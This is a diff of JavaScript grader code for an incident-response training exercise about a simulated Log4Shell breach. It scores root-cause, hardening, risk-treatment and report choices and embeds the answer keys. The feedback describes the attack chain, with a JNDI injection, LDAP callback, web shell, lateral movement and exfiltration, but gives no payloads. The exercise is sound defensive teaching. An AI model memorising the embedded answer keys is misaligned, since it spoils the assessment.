+    var submitBtn = document.getElementById('s3-submit');
+    if (submitBtn) { submitBtn.disabled = true; }
+
+    if (passed) {
+        unlockStage(4);
+    }
+}
+
+/* ════════════════════════════════════════════════════════════════
+   STAGE 4 GRADER -- Root Cause and Hardening
+   Part A: radio group root cause -- correct = rc2.
+   Part B: 8 checkboxes -- correct = hc1, hc2, hc3, hc4, hc5, hc6 (check these);
+           distractors = hc7, hc8 (should NOT be checked).
+   Total decisions: 1 + 8 = 9. Pass threshold: 8 of 9 (89%).
+════════════════════════════════════════════════════════════════ */
+function gradeStage4() {
+    var correct = 0;
+    var total   = 9;
+
+    /* ── Part A: Root cause radio ── */
+    var rcVal = document.querySelector('input[name="rootcause"]:checked');
+    var rcSelected = rcVal ? rcVal.value : '';
+    var rcItems = ['rc1','rc2','rc3','rc4'];
+    rcItems.forEach(function(rcId) {
+        var itemEl = document.getElementById('ri-' + rcId);
+        if (!itemEl) { return; }
+        if (rcId === 'rc2') {
+            /* Correct root cause */
+            if (rcSelected === 'rc2') {
+                correct++;
+                itemEl.classList.add('correct');
+                itemEl.classList.remove('incorrect');
+            } else {
+                itemEl.classList.add('incorrect');
+                itemEl.classList.remove('correct');
+            }
+        } else if (rcSelected === rcId) {
+            /* A wrong root cause was selected -- mark it incorrect */
+            itemEl.classList.add('incorrect');
+            itemEl.classList.remove('correct');
+        }
+        var radioEl = document.getElementById(rcId);
+        if (radioEl) { radioEl.disabled = true; }
+    });
+
+    /* Feedback for root cause */
+    var rcFbExisting = document.getElementById('s4-rc-fb');
+    if (!rcFbExisting) {
+        var rcFb = document.createElement('div');
+        rcFb.id = 's4-rc-fb';
+        rcFb.style.cssText = 'font-size:0.83rem; margin-top:10px; margin-bottom:18px; padding:10px 14px; border-radius:8px;';
+        if (rcSelected === 'rc2') {
+            rcFb.style.color = 'var(--ok)';
+            rcFb.textContent = 'Correct root cause. CVE-2021-44228 (Log4Shell) on WEB-DMZ-01 -- CVSS v3.1 10.0 Critical. The JNDI LDAP injection in the User-Agent header triggered RCE without any authentication.';
+        } else {
+            rcFb.style.color = 'var(--err)';
+            rcFb.textContent = 'Incorrect. The root cause is the unpatched Log4j library (CVE-2021-44228, CVSS 10.0) on WEB-DMZ-01. A JNDI lookup string in the HTTP User-Agent caused the server to make an outbound LDAP connection to the attacker, delivering a malicious payload = RCE.';
+        }
+        var rcGroup = document.getElementById('s4-rc');
+        if (rcGroup) { rcGroup.parentNode.insertBefore(rcFb, rcGroup.nextSibling); }
+    }
+
+    /* ── Part B: Hardening controls ── */
+    var CONTROLS = [
+        { id:'hc1', elem:'ci-H1', fb:'fb-hc1', correct:true,
+          explainOk:  'Correct -- patching Log4j directly eliminates CVE-2021-44228. This is the primary technical remediation.',
+          explainBad: 'Should be selected -- patching Log4j to 2.17.1+ directly closes CVE-2021-44228.' },
+        { id:'hc2', elem:'ci-H2', fb:'fb-hc2', correct:true,
+          explainOk:  'Correct -- a WAF JNDI-string rule adds a defense-in-depth layer; it would have blocked the exploit even if Log4j was still unpatched.',
+          explainBad: 'Should be selected -- a WAF rule blocking JNDI strings is a compensating control that directly closes this attack vector.' },
+        { id:'hc3', elem:'ci-H3', fb:'fb-hc3', correct:true,
+          explainOk:  'Correct -- and the KEY lesson of this incident. Egress filtering on the DMZ would have (1) blocked the outbound LDAP callback to 203.0.113.66:1389, killing the Log4Shell exploit at Step 2; and (2) blocked the 4.2 GB exfil from APP-INT-05. Two kill-chain steps disrupted by one control.',
+          explainBad: 'Should be selected. THIS is the control that would have stopped the attack at two points: the outbound LDAP callback (killing the exploit at Step 2) AND the exfiltration. Egress filtering is the key lesson of this incident.' },
+        { id:'hc4', elem:'ci-H4', fb:'fb-hc4', correct:true,
+          explainOk:  'Correct -- least-privilege on svc-deploy directly closes the lateral movement vector. A properly scoped service account cannot SSH across network segments.',
+          explainBad: 'Should be selected -- scoping svc-deploy to least-privilege closes the lateral movement vector (kill-chain Step 4).' },
+        { id:'hc5', elem:'ci-H5', fb:'fb-hc5', correct:true,
+          explainOk:  'Correct -- removing execute permissions from /var/www/app/uploads/ prevents the web shell from running even if it is uploaded.',
+          explainBad: 'Should be selected -- removing execute permissions from the upload directory directly closes the web shell execution vector (kill-chain Step 3).' },
+        { id:'hc6', elem:'ci-H6', fb:'fb-hc6', correct:true,
+          explainOk:  'Correct -- a hardened DMZ with firewall rules blocking direct SSH from DMZ to the internal network closes the lateral movement path even if credentials are harvested.',
+          explainBad: 'Should be selected -- enforcing DMZ-to-internal firewall rules closes the network-level lateral movement path independent of account privileges.' },
+        /* Distractors */
+        { id:'hc7', elem:'ci-H7', fb:'fb-hc7', correct:false,
+          explainOk:  'Correct exclusion -- a company-wide password reset does NOT fix the Log4Shell vulnerability. The root cause is an unpatched library. Passwords are irrelevant to CVE-2021-44228 RCE.',
+          explainBad: 'Incorrect -- a company-wide password reset does not address CVE-2021-44228. The vulnerability is in the Log4j library, not a credential weakness.' },
+        { id:'hc8', elem:'ci-H8', fb:'fb-hc8', correct:false,
+          explainOk:  'Correct exclusion -- antivirus on end-user workstations does not protect WEB-DMZ-01 (a server) and does not address Log4Shell, web shell execution on servers, or lateral movement via SSH.',
+          explainBad: 'Incorrect -- endpoint AV on workstations does not protect server-side applications from Log4Shell RCE or web shell deployment on servers.' }
+    ];
+
+    CONTROLS.forEach(function(c) {
+        var chkEl  = document.getElementById(c.id);
+        var itemEl = document.getElementById(c.elem);
+        var fbEl   = document.getElementById(c.fb);
+        var checked = chkEl ? chkEl.checked : false;
+        var decision = (c.correct && checked) || (!c.correct && !checked);
+
+        if (decision) {
+            correct++;
+            if (itemEl) { itemEl.classList.add('correct'); itemEl.classList.remove('incorrect'); }
+            if (fbEl)   { fbEl.textContent = c.explainOk; fbEl.className = 'check-fb show ok'; }
+        } else {
+            if (itemEl) { itemEl.classList.add('incorrect'); itemEl.classList.remove('correct'); }
+            if (fbEl)   { fbEl.textContent = c.explainBad; fbEl.className = 'check-fb show bad'; }
+        }
+
+        if (chkEl) { chkEl.disabled = true; }
+    });
+
+    STATE.stages[4].score = correct;
+    STATE.stages[4].total = total;
+    updateCumulativeScore();
+
+    var pct    = Math.round((correct / total) * 100);
+    var passed = correct >= 8; /* 8/9 = 89% >= 80% */
+    STATE.stages[4].passed = passed;
+
+    showStageResult(4, correct, total, pct, passed,
+        passed
+            ? 'Excellent remediation plan. You identified Log4Shell (CVE-2021-44228) as the root cause and selected all six hardening controls, including the key insight: egress filtering would have disrupted two kill-chain stages. Stage 5 unlocked.'
+            : 'Review the Log4Shell kill chain. The root cause is CVE-2021-44228, not a credential issue. All six hardening controls directly close attack-path steps. Egress filtering is the key lesson -- it would have blocked both the outbound LDAP callback AND the exfiltration. Reset and retry.'
+    );
+
+    var submitBtn = document.getElementById('s4-submit');
+    if (submitBtn) { submitBtn.disabled = true; }
+
+    if (passed) {
+        unlockStage(5);
+    }
+}
+
+/* ════════════════════════════════════════════════════════════════
+   STAGE 5 GRADER -- Risk and Executive Reporting
+   Part A: 4 risk treatment dropdowns.
+     RT1 (other Log4j) = Mitigate
+     RT2 (PII regulatory / cyber insurance) = Transfer
+     RT3 (svc-deploy systemic) = Mitigate
+     RT4 (reputational) = Accept
+   Part B: 10 report statements.
+     Correct = S1, S2, S3, S4, S5, S6 (select these)
+     Distractors = S7, S8, S9, S10 (should NOT be selected)
+   Total decisions: 4 + 10 = 14. Pass threshold: 12 of 14 (86%).
+════════════════════════════════════════════════════════════════ */
+function gradeStage5() {
+    var correct = 0;
+    var total   = 14;
+
+    /* ── Part A: Risk treatments ── */
+    var RISKS = [
+        { sel:'rt1-sel', row:'rt-row-1', answer:'Mitigate',
+          explainOk:  'Correct. Other Log4j instances should be Mitigated -- scan and patch all remaining vulnerable instances.',
+          explainBad: 'Incorrect. Other Log4j instances require Mitigate -- identify and patch all remaining vulnerable systems. Accept would leave unacceptable RCE exposure.' },
+        { sel:'rt2-sel', row:'rt-row-2', answer:'Transfer',
+          explainOk:  'Correct. The regulatory/litigation exposure is being Transferred to the cyber liability insurer. The policy absorbs breach notification costs.',
+          explainBad: 'Incorrect. Veridian Financial carries cyber liability insurance -- the regulatory/litigation financial risk is Transferred to the insurer, not mitigated away or accepted without coverage.' },
+        { sel:'rt3-sel', row:'rt-row-3', answer:'Mitigate',
+          explainOk:  'Correct. The systemic over-privileged service account risk requires Mitigate -- audit and scope all service accounts to least-privilege.',
+          explainBad: 'Incorrect. The svc-deploy systemic risk requires Mitigate -- audit all service accounts and apply least-privilege. Accept would leave an active vulnerability in the environment.' },
+        { sel:'rt4-sel', row:'rt-row-4', answer:'Accept',
+          explainOk:  'Correct. Reputational damage from mandatory public disclosure is unavoidable (Accept). A communications plan is in place to manage it.',
+          explainBad: 'Incorrect. Once mandatory disclosure is required, the reputational impact is unavoidable. This risk is Accepted with the mitigation of a drafted communications plan. It cannot be Avoided or fully Transferred.' }
+    ];
+
+    RISKS.forEach(function(r) {
+        var selEl  = document.getElementById(r.sel);
+        var rowEl  = document.getElementById(r.row);
+        var val    = selEl ? selEl.value : '';
+        var isOk   = (val === r.answer);
+
+        if (isOk) {
+            correct++;
+            if (rowEl) { rowEl.classList.add('correct'); }
+        } else {
+            if (rowEl) { rowEl.classList.add('incorrect'); }
+        }
+
+        if (selEl) { selEl.disabled = true; }
+    });
+
+    /* Inject risk feedback block */
+    var rfbEl = document.getElementById('s5-risk-fb');
+    if (rfbEl) {
+        rfbEl.innerHTML =
+            '<strong style="color:var(--primary);">Risk Treatment Key:</strong> ' +
+            'Log4j elsewhere = <span style="color:var(--ok)">Mitigate</span> (patch them); ' +
+            'PII regulatory = <span style="color:var(--ok)">Transfer</span> (cyber insurance absorbs cost); ' +
+            'svc-deploy systemic = <span style="color:var(--ok)">Mitigate</span> (audit + least-privilege all service accounts); ' +
+            'Reputational = <span style="color:var(--ok)">Accept</span> (mandatory disclosure is unavoidable; communications plan in place).';
+        rfbEl.style.display = 'block';
+    }
+
+    /* ── Part B: Report statements ── */
+    var STMTS = [
+        { id:'rs1', item:'rpt-S1', fb:'fb-rs1', correct:true,
+          explainOk:  'Correct -- accurate root cause statement: CVE-2021-44228, CVSS 10.0, WEB-DMZ-01, JNDI LDAP User-Agent.',
+          explainBad: 'Should be included -- this is the accurate root cause statement and must be in the executive report.' },
+        { id:'rs2', item:'rpt-S2', fb:'fb-rs2', correct:true,
+          explainOk:  'Correct -- accurate entry point and attacker IP (203.0.113.66). Both facts are verified in the logs.',
+          explainBad: 'Should be included -- the entry point (WEB-DMZ-01 / 10.10.10.20) and attacker IP (203.0.113.66) are confirmed facts.' },
+        { id:'rs3', item:'rpt-S3', fb:'fb-rs3', correct:true,
+          explainOk:  'Correct -- accurate data impact: 4,509,715,660 bytes (~4.2 GB) from APP-INT-05 to 203.0.113.66. Verified in the firewall log.',
+          explainBad: 'Should be included -- the exfil volume (4,509,715,660 bytes / ~4.2 GB) from APP-INT-05 is a verified, reportable impact fact.' },
+        { id:'rs4', item:'rpt-S4', fb:'fb-rs4', correct:true,
+          explainOk:  'Correct -- accurate lateral movement factor: svc-deploy over-privilege enabled the pivot from WEB-DMZ-01 to APP-INT-05.',
+          explainBad: 'Should be included -- the svc-deploy over-privilege as the lateral movement enabler is a key finding for the executive report.' },
+        { id:'rs5', item:'rpt-S5', fb:'fb-rs5', correct:true,
+          explainOk:  'Correct -- this is the KEY lesson of Operation Blackout. Egress filtering would have blocked both the LDAP callback (killing the exploit) and the 4.2 GB exfil. One control, two disruptions.',
+          explainBad: 'Should be included -- the egress filtering gap is the single most important finding. It is the one control that would have broken the kill chain at two separate stages.' },
+        { id:'rs6', item:'rpt-S6', fb:'fb-rs6', correct:true,
+          explainOk:  'Correct -- all five recommendations are accurate and directly address the specific attack path: Log4j patch, egress filter, least-privilege, upload-dir permissions, and cyber insurance use.',
+          explainBad: 'Should be included -- these five recommendations directly address the kill chain steps identified in this incident.' },
+        /* Distractors */
+        { id:'rs7', item:'rpt-S7', fb:'fb-rs7', correct:false,
+          explainOk:  'Correct exclusion -- the attacker did not brute-force SSH directly. The entry was Log4Shell RCE. svc-deploy credentials were harvested FROM the web shell on WEB-DMZ-01, not guessed.',
+          explainBad: 'Inaccurate -- the attacker did NOT brute-force svc-deploy directly. The entry was Log4Shell (CVE-2021-44228) RCE. Credentials were harvested via the web shell, not via direct SSH brute-force to APP-INT-05.' },
+        { id:'rs8', item:'rpt-S8', fb:'fb-rs8', correct:false,
+          explainOk:  'Correct exclusion -- wrong volume (3.5 GB, not 4.2 GB) AND wrong source host (WEB-DMZ-01, not APP-INT-05). Both facts are wrong.',
+          explainBad: 'Inaccurate -- two errors: (1) the exfil was 4,509,715,660 bytes (~4.2 GB), not 3.5 GB; (2) it originated from APP-INT-05 (10.10.20.15), not WEB-DMZ-01. This statement belongs in the distractor bin.' },
+        { id:'rs9', item:'rpt-S9', fb:'fb-rs9', correct:false,
+          explainOk:  'Correct exclusion -- the entry vector was Log4Shell (JNDI injection via User-Agent), NOT SQL injection. The logs contain no SQL injection evidence.',
+          explainBad: 'Inaccurate -- there is no SQL injection in this incident. The entry vector was Log4Shell (CVE-2021-44228) JNDI injection via the HTTP User-Agent header.' },
+        { id:'rs10', item:'rpt-S10', fb:'fb-rs10', correct:false,
+          explainOk:  'Correct exclusion -- a company-wide password reset does not remediate Log4Shell (a software vulnerability). This is a misleading recommendation in the executive report context.',
+          explainBad: 'Inaccurate recommendation -- password resets do not fix CVE-2021-44228. The root cause is an unpatched library, not a password weakness. Including this in the exec report misdirects the remediation effort.' }
+    ];
+
+    STMTS.forEach(function(s) {
+        var chkEl  = document.getElementById(s.id);
+        var itemEl = document.getElementById(s.item);
+        var fbEl   = document.getElementById(s.fb);
+        var checked = chkEl ? chkEl.checked : false;
+        var decision = (s.correct && checked) || (!s.correct && !checked);
+
+        if (decision) {
+            correct++;
+            if (itemEl) { itemEl.classList.add('correct'); itemEl.classList.remove('incorrect'); }
+            if (fbEl)   { fbEl.textContent = s.explainOk; fbEl.className = 'rpt-fb show ok'; }
+        } else {
+            if (itemEl) { itemEl.classList.add('incorrect'); itemEl.classList.remove('correct'); }
+            if (fbEl)   { fbEl.textContent = s.explainBad; fbEl.className = 'rpt-fb show bad'; }
+        }
+
+        if (chkEl) { chkEl.disabled = true; }
+    });
+
+    STATE.stages[5].score = correct;
+    STATE.stages[5].total = total;
+    updateCumulativeScore();
+
+    var pct    = Math.round((correct / total) * 100);
+    var passed = correct >= 12; /* 12/14 = 86% >= 80% */
+    STATE.stages[5].passed = passed;
+
+    showStageResult(5, correct, total, pct, passed,
+        passed
+            ? 'Incident closed. You accurately rated residual risks, applied the correct treatments, and assembled a factually sound executive report. Proceeding to the final Incident Report Card.'
+            : 'Review the incident bible facts: ~4.2 GB from APP-INT-05 (not WEB-DMZ-01), Log4Shell entry (not SQL injection / not password brute-force), and egress filtering as the key missing control. Reset and retry.'
+    );
+
+    var submitBtn = document.getElementById('s5-submit');
+    if (submitBtn) { submitBtn.disabled = true; }
+
+    if (passed) {
+        /* Mark stage 5 rail as passed, then show the final report card */
+        setTimeout(function() { showReportCard(); }, 800);
+    }
+}
+
+/* ── Generic stage result banner renderer ── */
+/*
+ * stageN: stage number (int)
+ * score, total: raw counts
+ * pct: percentage (int)
+ * passed: boolean
+ * message: explanatory string
+ */
+function showStageResult(stageN, score, total, pct, passed, message) {
+    var el = document.getElementById('s' + stageN + '-result');
+    if (!el) { return; }
+    var passClass = passed ? 'pass' : 'fail';
+    var headline  = passed
+        ? 'Stage ' + stageN + ' Passed'
+        : 'Stage ' + stageN + ' -- Not Yet Passed';
+    var unlockNote = passed && stageN < 5
+        ? '<div class="unlock-notice">Stage ' + (stageN + 1) + ' is now unlocked. Scroll down to continue.</div>'
+        : '';
+    el.className = 'stage-result show ' + passClass;
+    el.innerHTML =
+        '<h3>' + headline + '</h3>' +
+        '<span class="score-big">' + score + ' / ' + total + ' (' + pct + '%)</span>' +
+        '<p>' + message + '</p>' +
+        unlockNote;
+}
+
+/* ── Stage reset: clear answers and re-enable inputs for a given stage ── */
+/*
+ * Each stage has a slightly different reset procedure because the
+ * input types differ (checkbox / select / radio).
+ */
+function resetStage(stageNum) {
+    var resultEl   = document.getElementById('s' + stageNum + '-result');
+    var submitBtn  = document.getElementById('s' + stageNum + '-submit');
+
+    if (resultEl)  { resultEl.className = 'stage-result'; resultEl.innerHTML = ''; }
+    if (submitBtn) { submitBtn.disabled = false; }
+
+    /* Reset state for this stage */
+    STATE.stages[stageNum] = { passed: false, score: 0, total: 0 };
+    updateCumulativeScore();
+
+    if (stageNum === 1) {
+        /* Re-enable all alert checkboxes and clear visual state */
+        ['A1','A2','A3','A4','A5','A6','A7'].forEach(function(id) {
+            var chk = document.getElementById('chk-' + id);
+            var card = document.getElementById('ac-' + id);
+            var fb   = document.getElementById('fb-' + id);
+            if (chk)  { chk.checked = false; chk.disabled = false; }
+            if (card) { card.classList.remove('correct','incorrect'); }
+            if (fb)   { fb.className = 'alert-feedback'; fb.textContent = ''; }
+        });
+    }
+
+    if (stageNum === 2) {
+        ['q2-1','q2-2','q2-3','q2-4','q2-5','q2-6'].forEach(function(qid) {
+            var sel = document.getElementById(qid + '-sel');
+            var qEl = document.getElementById(qid);
+            var fb  = document.getElementById('fb-' + qid);
+            if (sel) { sel.value = ''; sel.disabled = false; }
+            if (qEl) { qEl.classList.remove('correct','incorrect'); }
+            if (fb)  { fb.className = 'q-feedback'; fb.textContent = ''; }
+        });
+    }
+
+    if (stageNum === 3) {
+        /* All action checkboxes across all three phases */
+        ['C1','C2','C3','C4','C5','C6','C7',
+         'E1','E2','E3','E4','E5','E6',
+         'R1','R2','R3','R4','R5'].forEach(function(id) {
+            var chk  = document.getElementById('ac-' + id);
+            var item = document.getElementById('ai-' + id);
+            var fb   = document.getElementById('fb-' + id);
+            if (chk)  { chk.checked = false; chk.disabled = false; }
+            if (item) { item.classList.remove('correct','incorrect'); }
+            if (fb)   { fb.className = 'action-fb'; fb.textContent = ''; }
+        });
+    }
+
+    if (stageNum === 4) {
+        /* Radio buttons */
+        ['rc1','rc2','rc3','rc4'].forEach(function(id) {
+            var r = document.getElementById(id);
+            if (r) { r.checked = false; r.disabled = false; }
+            var item = document.getElementById('ri-' + id);
+            if (item) { item.classList.remove('correct','incorrect'); }
+        });
+        /* Remove the injected RC feedback div if present */
+        var rcFb = document.getElementById('s4-rc-fb');
+        if (rcFb) { rcFb.parentNode.removeChild(rcFb); }
+        /* Hardening checkboxes */
+        ['hc1','hc2','hc3','hc4','hc5','hc6','hc7','hc8'].forEach(function(id) {
+            var chk  = document.getElementById(id);
+            var item = document.getElementById('ci-H' + id.replace('hc',''));
+            var fb   = document.getElementById('fb-' + id);
+            if (chk)  { chk.checked = false; chk.disabled = false; }
+            if (item) { item.classList.remove('correct','incorrect'); }
+            if (fb)   { fb.className = 'check-fb'; fb.textContent = ''; }
+        });
+    }
+
+    if (stageNum === 5) {
+        /* Risk treatment selects */
+        ['rt1-sel','rt2-sel','rt3-sel','rt4-sel'].forEach(function(id) {
+            var sel = document.getElementById(id);
+            var row = document.getElementById(id.replace('-sel', '-row').replace('rt','rt-row-').replace('rt-row-1-sel','rt-row-1').replace('-sel',''));
+            if (sel) { sel.value = ''; sel.disabled = false; }
+        });
+        /* Fix the row IDs properly */
+        ['rt-row-1','rt-row-2','rt-row-3','rt-row-4'].forEach(function(id) {
+            var row = document.getElementById(id);
+            if (row) { row.classList.remove('correct','incorrect'); }
+        });
+        var rfb = document.getElementById('s5-risk-fb');
+        if (rfb) { rfb.style.display = 'none'; rfb.innerHTML = ''; }
+        /* Report statement checkboxes */
+        ['rs1','rs2','rs3','rs4','rs5','rs6','rs7','rs8','rs9','rs10'].forEach(function(id) {
+            var chk  = document.getElementById(id);
+            var item = document.getElementById('rpt-S' + id.replace('rs',''));
+            var fb   = document.getElementById('fb-' + id);
+            if (chk)  { chk.checked = false; chk.disabled = false; }
+            if (item) { item.classList.remove('correct','incorrect'); }
+            if (fb)   { fb.className = 'rpt-fb'; fb.textContent = ''; }
+        });
+    }
+}
+
+/* ── Full capstone restart -- resets all state and returns to Stage 1 ── */
+function restartCapstone() {
+    /* Reset all stage state */
+    [1,2,3,4,5].forEach(function(n) {
+        STATE.stages[n] = { passed: false, score: 0, total: 0 };
+        resetStage(n);
+    });
+    STATE.currentStage = 1;
+    STATE.allComplete  = false;
+
+    /* Reset rail -- all locked except stage 1 */
+    updateRail(1, 'active');
+    [2,3,4,5].forEach(function(n) { updateRail(n, 'locked'); });
+
+    /* Re-lock stages 2-5 (hide content, show locked message) */
+    [2,3,4,5].forEach(function(n) {
+        var locked  = document.getElementById('s' + n + '-locked');
+        var content = document.getElementById('s' + n + '-content');
+        if (locked)  { locked.style.display  = ''; }
+        if (content) { content.style.display  = 'none'; }
+    });
+
+    /* Hide report card and restart button */
+    document.getElementById('reportCard').classList.remove('show');
+    document.getElementById('restartBtn').style.display = 'none';
+
+    /* Re-enable Stage 1 submit */
+    var s1btn = document.getElementById('s1-submit');
+    if (s1btn) { s1btn.disabled = false; }
+
+    updateCumulativeScore();
+
+    /* Scroll to top */
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+
+/* ── Initialization: render nothing extra; Stage 1 HTML is already visible ── */
+/* Log lines are rendered when Stage 2 unlocks to avoid rendering a hidden element */
+updateCumulativeScore();
+</script>
+
+
+<!-- ── Dr. Hex floating mood-ring button (always last before </body>) ──
+     The .lab.html extension auto-loads the mood-ring observer that watches
+     for 'correct' / 'incorrect' CSS classes applied by the graders above.
+     Do NOT add an observer script here -- the platform injects it.
+     Docs: _docs/operations/dr-hex-button-integration.md              ── -->
+<hex-ai-button mission-id="shield-capstone-breach-response" house="shield"></hex-ai-button>
+<script type="module" src="/_lib/HexAIButton.js"></script>
+</body>
+</html>
